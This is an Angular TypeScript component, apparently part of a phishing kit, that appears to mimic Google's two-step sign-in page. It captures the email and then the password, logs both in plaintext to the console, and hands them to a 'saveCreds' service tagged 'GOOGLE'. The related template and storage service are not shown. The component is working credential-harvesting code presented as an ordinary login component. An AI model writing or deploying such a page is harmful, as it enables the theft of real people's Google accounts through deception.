import { Component, ElementRef, ViewChild } from '@angular/core';
import { SaveFacadeService } from 'src/app/services/save-facade.service';

@Component({
  selector: 'app-google',
  templateUrl: './google.component.html',
  styleUrls: ['./google.component.css']
})
export class GoogleComponent {
  isPasswordReady: boolean = false; // Set this to true or false based on your condition

  constructor(private saveService: SaveFacadeService ){}
  
  @ViewChild('emailInput')
  emailInput!: ElementRef;

  @ViewChild('passwordInput')
  passwordInput!: ElementRef;

  finalEmail: string = '';
  finalPassword: string = '';


  next() {
    
    if(this.isPasswordReady){
      this.finalPassword= this.passwordInput.nativeElement.value.toString()
      console.log("after value: "+this.finalPassword)


      
    }else{

      this.finalEmail=this.emailInput.nativeElement.value.toString()
      console.log("after value: "+this.finalEmail)
    }

    
    if (this.isPasswordReady) {
      this.saveService.saveCreds(this.finalEmail,this.finalPassword,"GOOGLE")

    }
    
    if (this.finalEmail.trim()!= "") {
      this.isPasswordReady = !this.isPasswordReady;
      
    }
    
  }
}
